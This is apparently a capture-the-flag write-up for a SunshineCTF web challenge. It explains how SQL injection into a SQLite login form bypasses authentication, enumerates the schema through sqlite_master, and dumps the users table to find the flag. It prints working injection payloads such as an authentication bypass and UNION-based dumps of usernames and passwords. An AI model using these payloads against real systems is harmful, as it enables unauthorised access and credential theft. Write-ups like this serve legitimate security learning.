## WrestlerBook (Web, 100pts)

#### Challenge Description

WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn't get an invite don't even bother trying to view our profiles.

[http://bk.sunshinectf.org](http://bk.sunshinectf.org/)

Author: dmaria

#### Overview

When we click the link, we're brought to a login panel as shown below.

![](https://i.imgur.com/VhFsI2H.png)

It's safe to assume with no other inputs or anything that this challenge involves SQL Injection (SQLi). Using the classic username of `admin` and password of `' or 1;#`, we login and see one account for "Hulk Hogan", but the flag is marked "N/A".

![](https://i.imgur.com/LDJ2gIt.png)

This likely means there are multiple accounts, and only a few of them (or perhaps only one) has the actual flag. This means the challenge solution is to dump the entire table of accounts.

#### Gathering DB Info

Using another SQLi query in the password field that's bogus, such as `or1s`, we can get the SQL version used.

```
Warning: SQLite3::query(): Unable to prepare statement: 1, near "or1s": syntax error in /var/www/html/login.php on line 19
```

Next, we'll want a list of all the tables as well as their creation query. It's probably a safe bet that the name of the table of accounts is "users" as it commonly is, but I still wanted to get this information to be safe. We can use union statements to execute another select statement in the injection. All SQLite installations will have a table called `sqlite_master` which contains this information.

```
Username: admin
Password: ' union SELECT 1, 2, group_concat(name), 4, group_concat(sql), 6, 7, 8 FROM sqlite_master WHERE type = "table";#
```

From the page, we can get the query.

```
CREATE TABLE `users` (
	`username`	TEXT,
	`password`	TEXT,
	`avatar`	TEXT,
	`age`	INTEGER,
	`name`	TEXT,
	`title`	TEXT,
	`flag`	TEXT,
	`id`	INTEGER PRIMARY KEY AUTOINCREMENT
),CREATE TABLE sqlite_sequence(name,seq)
```

Cool, we now have the structure of the users table. From here, we can use these columns to dump all the accounts.

#### Dumping the flag

It's a bit messy, but I decided to get the information of all the fields from all accounts then parse through it for the flag. In this CTF, most flags have the format of `sun{...}`, so I ran the following injection and parsed through the dump.

```
Username: admin
Password: ' union SELECT group_concat(username), group_concat(password), group_concat(avatar), group_concat(age), group_concat(name), group_concat(title), group_concat(flag), group_concat(id) FROM users;#
```

From the page:

```
<div class="desc">Flag: N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,example_flag,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,sun{ju57_4n07h3r_5ql1_ch4ll},N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A</div>
```

As you can see, there were a lot of accounts in this database, so it's a good thing we didn't try to bruteforce a certain account and went with dumping the table.

Flag:

```
sun{ju57_4n07h3r_5ql1_ch4ll}
```

